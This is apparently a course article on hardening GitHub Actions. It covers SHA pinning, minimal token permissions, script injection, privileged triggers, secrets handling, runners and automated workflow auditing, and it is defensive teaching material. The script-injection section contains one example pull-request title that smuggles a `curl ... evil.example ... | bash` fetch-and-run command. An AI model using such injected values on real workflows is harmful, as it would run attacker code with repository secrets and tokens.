---
title: "Hardening Actions: Pinning and Least Privilege"
course: "Git and GitHub: Zero to Pro"
module: "9. Security and Supply Chain"
type: Article
level: Advanced
reading_time: 30 min
---

# Hardening Actions: Pinning and Least Privilege: The Complete Guide

> 📚 **Before you start**
>
> - [Triggers and Events](../07-github-actions/triggers-and-events.md), especially `pull_request_target` and `workflow_run`
> - [Secrets, Variables and Environments](../07-github-actions/secrets-variables-and-environments.md)
> - [OIDC: Deploying to the Cloud without Stored Keys](../07-github-actions/oidc-deploying-to-the-cloud-without-stored-keys.md)
> - [Dependabot Alerts and Updates](dependabot-alerts-and-updates.md)

## Introduction

Your CI system is the most privileged robot in the company. It can read all your code, holds deploy credentials, publishes packages your users install, and runs code from dozens of third parties on every push. Attackers have noticed. Compromising one popular action, or tricking one workflow into running a stranger's code, can reach thousands of repositories at once.

In March 2025, the widely used `tj-actions/changed-files` action was compromised: its version tags were repointed to a malicious commit that dumped CI secrets into workflow logs. Every repository using `@v35` or `@v44` ran the attacker's code on its next build. Repositories that had pinned the action to a full commit SHA were unaffected.

This lesson is the checklist that would have saved them, and much more. By the end you'll know how to pin actions safely and keep pins updated, give every token the least privilege, prevent script injection, use the dangerous triggers safely, protect secrets and runners, and audit workflows with automated tools and organization policies.

> 💡 **Key Insight**
>
> Assume any step in a workflow **could be malicious**: a compromised action, an injected command, a poisoned dependency. Then make sure that when it happens, it runs **code you pinned**, with a token that **can do almost nothing**, with **no secrets it doesn't need**, on a runner that's **thrown away afterwards**.

---

## Core Explanation

### 1. The Threat Map

| Threat | How it happens | Main defence |
|---|---|---|
| **Compromised third-party action** | A maintainer account or release is hijacked; tags are moved to malicious code | Pin to full commit SHAs; restrict allowed actions |
| **Script injection** | Untrusted text (PR title, branch name, issue body) is pasted into a `run:` script with `${{ }}` | Pass through `env:`, never expand untrusted data inline |
| **Pwn request** | `pull_request_target` or `workflow_run` checks out and runs fork code with secrets | Never run untrusted code in privileged triggers |
| **Over-privileged token** | `GITHUB_TOKEN` has write access the job doesn't need | Explicit minimal `permissions:` |
| **Secret exposure** | Secrets available to steps that don't need them; leaked in logs or artifacts | Scope secrets to jobs and environments; OIDC |
| **Credential persistence** | `actions/checkout` stores the token in `.git/config`, which later steps or artifacts can leak | `persist-credentials: false` |
| **Runner compromise** | A self-hosted runner keeps state between jobs, or reaches internal networks | Ephemeral runners; never on public repos |
| **Cache or artifact poisoning** | A low-trust run writes a cache or artifact that a high-trust run uses | Separate privileged jobs; don't trust artifacts from fork runs |

### 2. Pinning Actions to Commit SHAs

`uses: owner/action@v4` points at a **tag**, and tags can be moved by anyone with write access to that action's repository, including an attacker. A full 40-character **commit SHA** can't be moved: it's the hash of the exact code (see [Hashes and Content Addressing](../course.md#m3)).

```yaml
steps:
  # Mutable: whatever v7 points to today
  - uses: actions/checkout@v7

  # Immutable: exactly this code, forever. The comment tells humans (and Dependabot) the version.
  - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
```

Finding the SHA for a tag:

```bash
git ls-remote --tags https://github.com/actions/checkout v7.0.1
```

Example output:

```
3d3c42e5aac5ba805825da76410c181273ba90b1	refs/tags/v7.0.1
```

(If a tag is annotated, the listing also shows a `v7.0.1^{}` line; use that commit SHA.) Short SHAs aren't accepted; a SHA from a fork of the action isn't safe either, so make sure it's in the real repository.

**Keeping pins fresh.** Pinning without updating leaves you on old, possibly vulnerable versions. Add the `github-actions` ecosystem to `dependabot.yml`; Dependabot understands SHA pins with version comments and opens PRs that bump both. Combine with a **cooldown** so you don't adopt a brand-new release within hours of publication.

**What about GitHub's own actions?** They're lower risk, but the March 2025 incident showed that "popular and trusted" isn't a security control. Many organizations pin everything, which is also simplest to enforce.

**Pinning doesn't cover everything an action fetches.** A composite action might call another action by tag, and a Docker action might pull `image:latest`. Prefer actions that pin their own dependencies, and audit the ones you rely on.

### 3. Organization Policies: Allowed Actions and Required Pinning

In organization (or repository) **Settings → Actions → General → Policies**, you can:

- Allow **only** GitHub-made actions, actions by **verified creators**, and an explicit list of others (`my-org/*`, `docker/build-push-action@*`).
- **Block** specific actions or versions by prefixing them with `!` in the allowed list, useful in an incident to cut off a compromised action everywhere at once.
- **Require actions to be pinned to a full-length commit SHA**. Workflows that use an unpinned action then fail.

Repository settings also include **Workflow permissions**: set the default `GITHUB_TOKEN` to **read repository contents and packages permissions**, and leave **Allow GitHub Actions to create and approve pull requests** off unless you need it.

### 4. Least Privilege for `GITHUB_TOKEN`

Start every workflow from zero and grant per job:

```yaml
name: CI
on: [pull_request]

permissions: {}            # nothing by default for every job

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read       # just enough to check out
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: python -m pytest -q

  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write # only this job can label
    steps:
      - run: gh pr edit "$PR" --add-label tested
        env:
          GH_TOKEN: ${{ github.token }}
          PR: ${{ github.event.pull_request.html_url }}
```

Rules of thumb:

- **Top-level `permissions: {}`** (or `contents: read`), then add per job.
- **Separate jobs** for anything that needs write access, so the job running tests, linters or third-party tools never holds a write token.
- **`persist-credentials: false`** on checkout unless a later step really needs to push. By default, checkout leaves the token in `.git/config`, where any later step (or an uploaded artifact containing `.git/`) can read it.
- **`id-token: write` only on the deploy job**, never globally.

### 5. Script Injection

This step looks harmless:

```yaml
# DON'T: untrusted text is pasted into the script before bash runs it
- run: echo "New PR: ${{ github.event.pull_request.title }}"
```

GitHub replaces `${{ }}` **before** the shell sees the script. A pull request titled `x"; curl -sSL https://evil.example/s | bash; echo "` turns that into a command that downloads and runs an attacker's script, with whatever the job's token and secrets allow. Branch names, issue titles and bodies, comment text, commit messages, labels and author names are all attacker-controlled.

The fix is to pass the value as an **environment variable**, which the shell treats as data:

```yaml
# DO: the value arrives as data in an env var
- run: echo "New PR: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

The same applies inside `actions/github-script`: read `context.payload.pull_request.title` in JavaScript rather than interpolating `${{ }}` into the script body.

### 6. Privileged Triggers Done Safely

`pull_request_target`, `workflow_run` and (to a degree) `issue_comment` run in the context of the base repository, with secrets and a potentially writable token. They're safe only if they **never execute code or build scripts from the pull request**.

```yaml
# Safe pattern: build untrusted code without secrets, then act on the result separately.
# Workflow 1 (pull_request): runs fork code, no secrets, read-only token, uploads a report.
# Workflow 2 (workflow_run): has write access, downloads the report as DATA, posts a comment.
on:
  workflow_run:
    workflows: ["PR checks"]
    types: [completed]

permissions:
  pull-requests: write
  actions: read

jobs:
  comment:
    if: github.event.workflow_run.event == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v8
        with:
          name: report
          run-id: ${{ github.event.workflow_run.id }}
          github-token: ${{ github.token }}
      - name: Post report (treat contents as untrusted text)
        run: |
          pr=$(jq -r '.pr_number' report.json)
          [[ "$pr" =~ ^[0-9]+$ ]] || { echo "bad PR number"; exit 1; }
          gh pr comment "$pr" --repo "$REPO" --body-file summary.md
        env:
          GH_TOKEN: ${{ github.token }}
          REPO: ${{ github.repository }}
```

The privileged workflow never checks out or runs the fork's code; it validates the PR number before using it and only posts text. CodeQL's `actions` language queries and tools like zizmor flag the unsafe versions of these patterns automatically.

### 7. Secrets and Credentials

- **Give secrets to the step that needs them**, through `env:` on that step, not at the top of the workflow.
- **Use environments** for deploy secrets, with required reviewers and branch rules, so ordinary CI never holds them.
- **Prefer OIDC** over stored cloud keys. A stolen OIDC token expires in minutes and only works for what your trust policy allows.
- **Don't pass secrets to actions you haven't reviewed.** An action that receives your deploy key can send it anywhere.
- **Watch what you upload.** Artifacts are downloadable by anyone with read access to the repository (for public repos, anyone). Never upload `.env` files, `.git/` folders or debug dumps.

### 8. Runners

- **GitHub-hosted runners** are fresh VMs per job, the safest default.
- **Self-hosted runners** should be **ephemeral** (one job, then destroyed; Actions Runner Controller on Kubernetes does this), isolated from sensitive networks, and **never used by public repositories**, where any fork PR could run code on them.
- **Egress control** limits where a compromised step can send data. Third-party tools such as StepSecurity's Harden-Runner can monitor or block outbound traffic from jobs, and GitHub has announced a native egress firewall for hosted runners on its 2026 Actions security roadmap.
- **Timeouts** (`timeout-minutes`) stop a hijacked job from running a crypto miner for six hours.

### 9. Automated Auditing

You can't review every workflow by eye. A tiny audit script shows the kind of checks that real tools perform:

```python
import re

SHA = re.compile(r"@[0-9a-f]{40}\b")
UNTRUSTED = re.compile(r"\$\{\{\s*github\.(event\.(issue|comment|pull_request|review|head_commit|pages)\S*|head_ref)\s*\}\}")

def audit_workflow(text):
    findings = []
    lines = text.splitlines()
    if not any(re.match(r"^permissions:", l) for l in lines):
        findings.append("no top-level permissions block (token gets the repository default)")
    in_run = False
    for n, line in enumerate(lines, 1):
        stripped = line.strip()
        m = re.match(r"-?\s*uses:\s*(\S+)", stripped)
        if m and not m.group(1).startswith("./") and not SHA.search(m.group(1)):
            findings.append(f"line {n}: {m.group(1)} is not pinned to a full commit SHA")
        if re.match(r"-?\s*run:", stripped):
            in_run = True
        elif re.match(r"-?\s*(uses|with|env|name|id|if):", stripped):
            in_run = False
        if in_run and UNTRUSTED.search(line):
            findings.append(f"line {n}: untrusted event data expanded inside run (script injection)")
        if "pull_request_target" in line:
            findings.append(f"line {n}: pull_request_target runs with secrets; never check out PR code")
        if "persist-credentials: true" in stripped:
            findings.append(f"line {n}: checkout keeps the token in .git/config")
    return findings

risky = """name: Greet
on: pull_request_target
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: echo "Thanks for: ${{ github.event.pull_request.title }}"
      - uses: some-org/fancy-action@main
"""
for f in audit_workflow(risky):
    print("-", f)
```

Output:

```
- no top-level permissions block (token gets the repository default)
- line 2: pull_request_target runs with secrets; never check out PR code
- line 7: actions/checkout@v7 is not pinned to a full commit SHA
- line 10: untrusted event data expanded inside run (script injection)
- line 11: some-org/fancy-action@main is not pinned to a full commit SHA
```

```python
safe = """name: Greet
on: pull_request
permissions:
  contents: read
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: echo "Thanks for: $TITLE"
        env:
          TITLE: ${{ github.event.pull_request.title }}
"""
print(audit_workflow(safe))
```

Output:

```
[]
```

Real tools to run in CI:

| Tool | What it checks |
|---|---|
| **CodeQL** with the `actions` language | Injection, untrusted checkouts in privileged triggers, excessive permissions |
| **zizmor** | A dedicated static analyser for workflow security: unpinned uses, template injection, credential persistence, dangerous triggers |
| **actionlint** | Workflow syntax and expression type errors, plus shellcheck on `run:` scripts |
| **OpenSSF Scorecard** (`ossf/scorecard-action`) | Scores a repository's practices: pinned dependencies, token permissions, branch protection, signed releases |

### 10. A Hardened Workflow Template

```yaml
name: CI

on:
  pull_request:
  push:
    branches: [main]

permissions: {}

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
        with:
          python-version: "3.13"
      - run: python -m pip install -e ".[test]"
      - run: python -m pytest -q
```

Checklist version, for reviews:

- [ ] Every third-party `uses:` pinned to a full SHA with a version comment; Dependabot updates them
- [ ] `permissions: {}` (or `contents: read`) at top; minimal per-job grants
- [ ] `persist-credentials: false` unless pushing
- [ ] No `${{ github.event.* }}` or `github.head_ref` inside `run:`; values passed via `env:`
- [ ] No checkout or execution of fork code in `pull_request_target`/`workflow_run`
- [ ] Secrets scoped to steps and environments; OIDC for clouds
- [ ] `timeout-minutes` on every job
- [ ] No self-hosted runners on public repos; ephemeral elsewhere
- [ ] CODEOWNERS requires security review for `.github/workflows/`
- [ ] zizmor/actionlint/CodeQL run on workflow changes

---

## Try It Yourself

1. **Pin it.** Rewrite `uses: actions/upload-artifact@v7` pinned to its `v7.0.2` commit, `cf430e030ddbb5b0abf93d22962f4752f3646cd9`.
2. **Fix the injection.** Make this step safe: `run: git checkout -b "review/${{ github.head_ref }}"`.
3. **Audit.** Run `audit_workflow` on a workflow with `permissions: write-all` at the top and a pinned checkout. Does the script catch the problem? What check would you add?
4. **Incident response.** A popular action you use is reported compromised this morning. List the first four things you do.

<details>
<summary>Show answers</summary>

**1.**

```yaml
- uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
```

**2.**

```yaml
- run: git checkout -b "review/$HEAD_REF"
  env:
    HEAD_REF: ${{ github.head_ref }}
```

**3.**

```python
wide = """name: Wide
on: push
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
"""
print(audit_workflow(wide))
```

Output:

```
[]
```

It isn't caught: the script only checks that a permissions block exists. Add a check that flags `write-all` (and broad `write` scopes at the top level).

**4.** (a) Find every workflow that uses it (code search for the action name across the organization); (b) block it with an organization policy (`!owner/action@*`) or remove it; (c) check recent workflow logs and runs for signs of exfiltration, and rotate any secrets those workflows could access; (d) review audit logs and, after the maintainers publish a clean release, re-pin to a verified SHA.

</details>

---

## Real-World Examples

### Example 1: The `tj-actions/changed-files` Compromise

In March 2025, attackers repointed the action's tags to a commit that printed runner memory, including secrets, into build logs. Public repositories' logs were readable by anyone. Repositories pinned to a SHA were unaffected; everyone else had to audit logs and rotate credentials. The incident made SHA pinning, and GitHub's ability to enforce it by policy, mainstream.

### Example 2: A Pwn Request

Researchers have repeatedly found popular open source repositories with `pull_request_target` workflows that checked out the PR's head and ran `npm install` or tests. A malicious PR could run code with the repository's write token and secrets, enough to push malicious commits or publish packages. The fix in every case was to split privileged and unprivileged work.

### Example 3: Scorecard as a Habit

An open source foundation requires projects to run OpenSSF Scorecard and fix "Pinned-Dependencies" and "Token-Permissions" findings before graduating. Scores across the foundation's repositories rose within a quarter, mostly from adding `permissions:` blocks and SHA pins.

---

## Common Misconceptions

### Misconception 1: "Version tags are immutable"

Git tags can be deleted and recreated pointing anywhere. Only a commit SHA is fixed (immutable releases help for repositories that enable them, but you can't rely on every action's maintainers doing so).

### Misconception 2: "Our repo is private, so injection doesn't matter"

Branch names, commit messages and issue text from any collaborator, bot or compromised account can still carry payloads. Treat event data as untrusted everywhere.

### Misconception 3: "Masking protects secrets from malicious steps"

Masking hides exact matches in logs. A malicious step can encode the secret, or send it over the network.

### Misconception 4: "Pinning means I'll never get updates"

Dependabot updates SHA pins (with their version comments) through normal pull requests, so you get updates deliberately and reviewably.

---

## Interview Relevance

CI/CD security has become a standard topic for DevOps, platform and security engineers:

- **Supply chain:** mutable tags versus SHAs; Dependabot for pins; allowed-actions and require-SHA policies; the tj-actions incident.
- **Least privilege:** `permissions: {}` plus per-job grants; read-only default token; `persist-credentials: false`; `id-token: write` only where needed.
- **Injection:** `${{ }}` expansion before the shell runs; `env:` as the fix.
- **Privileged triggers:** `pull_request_target`/`workflow_run` safe patterns.
- **Runners and secrets:** ephemeral runners, no self-hosted on public repos, environment-scoped secrets, OIDC, egress control.
- **Tooling:** CodeQL actions queries, zizmor, actionlint, Scorecard.

Common follow-ups:

- *"Walk me through securing a workflow that comments on fork PRs."* Untrusted build in `pull_request` with no secrets; privileged `workflow_run` that only reads artifacts as data and validates them.
- *"Why might pinning by SHA still be unsafe?"* The SHA could belong to a fork, or the action could pull other unpinned code at runtime.

---

## Key Takeaways

- **Pin third-party actions to full commit SHAs** with a version comment, let **Dependabot** update them, and enforce pinning with **organization policy**.
- **Start from `permissions: {}`**, grant per job, set the default token to read-only, and use **`persist-credentials: false`**.
- **Never expand untrusted event data inside `run:`**; pass it through `env:`.
- **Privileged triggers must never run fork code**; split untrusted builds from privileged actions.
- **Scope secrets, prefer OIDC, use ephemeral runners, set timeouts, and audit workflows automatically** with CodeQL, zizmor, actionlint and Scorecard.

---

**Up next:** [Removing a Leaked Secret from History](removing-a-leaked-secret-from-history.md)
